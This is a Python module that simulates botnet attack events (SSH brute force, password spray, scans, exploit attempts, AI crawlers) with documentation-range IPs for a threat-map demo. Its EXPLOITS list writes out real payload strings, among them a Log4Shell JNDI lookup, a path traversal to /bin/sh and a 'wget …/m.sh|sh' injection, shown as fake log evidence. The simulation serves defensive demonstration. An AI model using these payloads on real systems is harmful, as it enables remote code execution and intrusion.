"""Sample source: realistic fake attacks, so anyone can run the arena without Azure.

IPs come from the documentation-only ranges (RFC 5737), so no real address is
ever shown as an attacker. Locations are city centres, not real attackers.
"""
import random
from datetime import datetime, timedelta, timezone

from .events import ThreatEvent

CITIES = [
    ("Netherlands", "Amsterdam", 52.37, 4.90), ("Germany", "Frankfurt", 50.11, 8.68),
    ("Russia", "Moscow", 55.76, 37.62), ("China", "Shanghai", 31.23, 121.47),
    ("China", "Beijing", 39.90, 116.40), ("Vietnam", "Hanoi", 21.03, 105.85),
    ("India", "Mumbai", 19.08, 72.88), ("Brazil", "São Paulo", -23.55, -46.63),
    ("United States", "Ashburn", 39.04, -77.49), ("United States", "Dallas", 32.78, -96.80),
    ("Singapore", "Singapore", 1.35, 103.82), ("South Korea", "Seoul", 37.57, 126.98),
    ("Iran", "Tehran", 35.69, 51.39), ("Ukraine", "Kyiv", 50.45, 30.52),
    ("Indonesia", "Jakarta", -6.21, 106.85), ("Nigeria", "Lagos", 6.52, 3.38),
]
TEST_NETS = ["192.0.2", "198.51.100", "203.0.113"]

USERS = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "git", "pi", "user", "azureuser"]
PASSWORDS = ["123456", "password", "admin", "root", "P@ssw0rd", "qwerty", "1qaz2wsx", "ubuntu"]
SPRAY = ["Spring2026!", "Welcome1", "Autumn2026!", "Company123!"]
SCAN_PATHS = ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin/config.php",
              "/server-status", "/actuator/env", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"]
EXPLOITS = ["GET /?x=${jndi:ldap://{ip}:1389/a}", "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
            "POST /boaform/admin/formLogin?cmd=;wget http://{ip}/m.sh|sh",
            "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array"]
CRAWLERS = ["GPTBot/1.2", "ClaudeBot/1.0", "CCBot/2.0", "Bytespider",
            "Mozilla/5.0 (Windows NT 10.0) Chrome/120.0 (headless)"]
ACCOUNTS = ["alex@contoso.com", "sam@contoso.com", "jordan@contoso.com", "lee@contoso.com",
            "pat@contoso.com", "chris@contoso.com", "morgan@contoso.com", "taylor@contoso.com"]

TARGETS = {
    "ssh_bruteforce": "honeypot ssh :22",
    "password_spray": "Entra ID sign-in",
    "vuln_scan": "web app :443",
    "exploit_attempt": "web app :443",
    "ai_crawler": "web app :443",
    "credential_stuffing": "web login /login",
}

# How often each attack shows up (relative weight) and its burst size range.
MIX = {
    "ssh_bruteforce": (40, (5, 120)),
    "vuln_scan": (25, (10, 300)),
    "ai_crawler": (12, (50, 900)),
    "password_spray": (8, (8, 40)),
    "credential_stuffing": (8, (20, 200)),
    "exploit_attempt": (7, (1, 6)),
}


def _evidence(attack, ip, count, when, rng):
    ts = when.strftime("%Y-%m-%dT%H:%M:%SZ")
    n = min(count, 4)
    if attack == "ssh_bruteforce":
        return [f"{ts} cowrie login attempt [{rng.choice(USERS)}/{rng.choice(PASSWORDS)}] failed src={ip}"
                for _ in range(n)]
    if attack == "password_spray":
        pw = rng.choice(SPRAY)
        return [f"{ts} SigninLogs user={a} result=50126 (invalid password) ip={ip} app=Exchange ActiveSync "
                f"password_hint={pw[:3]}…" for a in rng.sample(ACCOUNTS, n)]
    if attack == "vuln_scan":
        return [f'{ip} - - [{ts}] "GET {p} HTTP/1.1" 404 0 "-" "zgrab/0.x"' for p in rng.sample(SCAN_PATHS, n)]
    if attack == "exploit_attempt":
        return [f'{ip} - - [{ts}] "{rng.choice(EXPLOITS).replace("{ip}", ip)} HTTP/1.1" 400 0 "-" "Go-http-client/1.1"']
    if attack == "ai_crawler":
        agent = rng.choice(CRAWLERS)
        return [f'{ip} - - [{ts}] "GET /docs/page-{rng.randint(1, 400)} HTTP/1.1" 200 18342 "-" "{agent}"'
                for _ in range(n)]
    if attack == "credential_stuffing":
        return [f'{ip} - - [{ts}] "POST /login HTTP/1.1" 401 0 user={a}' for a in rng.sample(ACCOUNTS, n)]
    return []


class SampleSource:
    """Simulated botnet campaigns. Each tick() returns the events since the last tick."""

    name = "Sample data"

    def __init__(self, seed=None, rate_per_minute=30):
        self.rng = random.Random(seed)
        self.rate = rate_per_minute
        # A campaign is one botnet: one attack type, a few home cities, a pool of IPs.
        # Start with one per attack type so every type shows up, plus a few extra.
        self.campaigns = [self._campaign(a) for a in MIX] + [self._campaign() for _ in range(4)]

    def _campaign(self, attack=None):
        rng = self.rng
        attack = attack or rng.choices(list(MIX), weights=[w for w, _ in MIX.values()])[0]
        cities = rng.sample(CITIES, rng.randint(1, 4))
        ips = [f"{rng.choice(TEST_NETS)}.{rng.randint(1, 254)}" for _ in range(rng.randint(2, 8))]
        return {"attack": attack, "cities": cities, "ips": ips}

    def tick(self, now=None, seconds=5):
        now = now or datetime.now(timezone.utc)
        rng = self.rng
        expected = self.rate * seconds / 60
        n = int(expected) + (rng.random() < expected % 1)
        if rng.random() < 0.05:  # botnets come and go
            self.campaigns[rng.randrange(len(self.campaigns))] = self._campaign()
        events = []
        weights = [MIX[c["attack"]][0] for c in self.campaigns]
        for _ in range(n):
            c = rng.choices(self.campaigns, weights=weights)[0]
            country, city, lat, lon = rng.choice(c["cities"])
            ip = rng.choice(c["ips"])
            low, high = MIX[c["attack"]][1]
            count = rng.randint(low, high)
            when = now - timedelta(seconds=rng.uniform(0, seconds))
            events.append(ThreatEvent(
                time=when, attack=c["attack"], source_ip=ip, country=country, city=city,
                lat=lat + rng.uniform(-0.6, 0.6), lon=lon + rng.uniform(-0.6, 0.6),
                target=TARGETS[c["attack"]], count=count,
                blocked=rng.random() > (0.15 if c["attack"] == "exploit_attempt" else 0.03),
                evidence=_evidence(c["attack"], ip, count, when, rng),
            ))
        return sorted(events, key=lambda e: e.time)

    def history(self, minutes=15, now=None):
        """Backfill so the map isn't empty when the page opens."""
        now = now or datetime.now(timezone.utc)
        events = []
        for step in range(minutes * 12, 0, -1):
            events += self.tick(now - timedelta(seconds=5 * step), seconds=5)
        return events
